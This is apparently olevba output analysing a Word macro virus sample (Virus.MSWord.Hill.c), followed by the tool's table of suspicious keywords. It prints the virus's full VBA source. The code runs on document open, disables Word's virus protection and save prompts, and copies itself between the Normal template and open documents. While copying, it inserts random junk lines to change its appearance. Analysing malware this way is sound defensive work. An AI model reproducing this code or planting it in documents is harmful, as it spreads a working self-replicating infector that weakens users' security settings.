olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.c-cf48ed8968363e287a0db0565a730b11b8e2f216
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.c-cf48ed8968363e287a0db0565a730b11b8e2f216 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public FJ, FRN
Public FMT, FVT
Sub AutoOpen()
   On Error Resume Next
 H = "�" 'xs˜9¡¡
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 K = "y" '<xM0wŠqR‚
   Options.VirusProtection = False
 J = "g" 'Wx†]N¯¥U†E
   Options.ConfirmConversions = False
 V = "3" 'Ir£
   Options.SaveNormalPrompt = False
 U = "4" 'ªIG
   Randomize
   FMT = "F"
 F = "{" 'X‘H8
   FVT = FGN(1, 26, 65)
 U = "H" '†¤Š
   FRN = Mid(Str(Int(1 * Rnd + 1)), 2)
 F = "m" '2>žˆbb2
   If NT.CountOfLines < 60 Then
 B = "ª" 'š£
      FS = FCM(AD, NT)
 X = "¦" 'Kªn2Œ†”2
   Else
 Q = "�" '0=Y9
      FS = FCM(NT, AD)
 M = "˜" 'ThdƒA®‹C„
   End If
 J = "^" 'ž“1uŒs17œa
End Sub
Function FCM(FOC, FKC)
   FJ = 1
 L = "\" 'Ž=D�
   For I = 1 To FOC.CountOfLines
 I = "_" '­”¯H6\R–N¬
      If FCS(FOC.Lines(I, 1)) <> 1 Then
         FLN = FRP(FOC.Lines(I, 1), FMT, FVT)
 A = "®" '«šxR‚p
         FLN = FRP(FLN, "1", FRN)
 L = "¥" '¢¦j¤y¨i4
         FKC.InsertLines FJ, FLN
 U = "{" '0
         FJ = FJ + 1
 P = "t" 'x9
         If FCS(FOC.Lines(I, 1)) = 0 Then
 Q = "T" '‰V
            R = Rnd
 I = "C" 'L§zh¢Bv
            If R < 1 And R > 0.08 Then
               FKC.InsertLines FJ, " " + FGN(1, 26, 65) + " = " + Chr(34) + FGN(1, 128, 48) + Chr(34) + " " + Chr(39) + FGN(10, 128, 48)
 V = "�" '�7ƒ’ˆ
            End If
 T = "q" 'J9yDšn‹Ÿw
            If R < 0.08 And R > 0.05 Then
 E = "H" 'Y
            End If
 T = "6" 'K@u�095pKK
            If R < 0.05 And R > 0.03 Then
 A = "p" 'a§KrZC{t
            End If
 B = "š" '��W3W:=k
            If R > 0.03 Then FJ = FJ + 1
 X = "N" '2@
         End If
      End If
 L = "k" '\o\
   Next
End Function
Function FCS(FST)
   FCS = 0
 I = "¥" ']0_
   For I = 1 To Len(FST)
 U = "J" 'L
      If Mid(FST, I, 1) = Chr(39) Then FCS = 1
 G = "Z" '¢H`S=QTcg
   Next
 Y = "E" 'xGªIi‡ON¡
   If Mid(FST, 1, 1) <> " " Then FCS = 2
 I = "C" '8Yg�›
End Function
Function FGN(FSA, FSB, FSC)
   FGN = ""
 Q = "Š" '§pYJŽ1
   For FI = 1 To Int(FSA * Rnd + 1)
 V = "�" 'z‡FSd=
      FGN = FGN + Chr(Int(FSB * Rnd + FSC))
 F = "¡" 'Z˜_|mw™oLP
   Next
 L = "•" 'Pfg�­Il–zX
End Function
Function FRP(FST, FZA, FZB)
   FLA = Len(FZA)
 E = "§" '¥^˜1
   For ii = 1 To Len(FST)
 E = "©" 'v£kbnl¤¡‘„
      If Mid(FST, ii, FLA) = FZA Then
 E = "3" 'x`t‹ H7o�N
         FST = Mid(FST, 1, ii - 1) + FZB + Mid(FST, ii + FLA)
 C = "’" 'J1¦‚”gi
      End If
 N = "}" 'aC\Ldž@
   Next
 G = "y" 'Ÿ;;[R
   FRP = FST
 A = ":" 'r„}‚9wo
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

